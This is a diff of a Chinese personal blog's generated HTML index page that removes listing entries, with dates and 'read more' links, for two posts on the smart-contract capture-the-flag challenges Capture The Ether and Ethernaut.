-      <meta itemprop="name" content="undefined | scw's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/08/15/Capture%20The%20Ether/" class="post-title-link" itemprop="url">Capture The Ether</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2023-08-15 18:42:45" itemprop="dateCreated datePublished" datetime="2023-08-15T18:42:45+08:00">2023-08-15</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-11-05 00:59:07" itemprop="dateModified" datetime="2023-11-05T00:59:07+08:00">2023-11-05</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="Guess-the-number"><a href="#Guess-the-number" class="headerlink" title="Guess the number"></a>Guess the number</h3>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/08/15/Capture%20The%20Ether/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
+            <div class="post-nav-item">
             </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
+          </div>
     </footer>
   </article>
 </div>
 
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/28/Ethernaut/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="scw">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="scw's Blog">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | scw's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/07/28/Ethernaut/" class="post-title-link" itemprop="url">Ethernaut</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2023-07-28 00:50:00" itemprop="dateCreated datePublished" datetime="2023-07-28T00:50:00+08:00">2023-07-28</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-11-05 00:50:52" itemprop="dateModified" datetime="2023-11-05T00:50:52+08:00">2023-11-05</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="一-fallback"><a href="#一-fallback" class="headerlink" title="一.fallback"></a>一.fallback</h3>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/07/28/Ethernaut/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
 
 
 
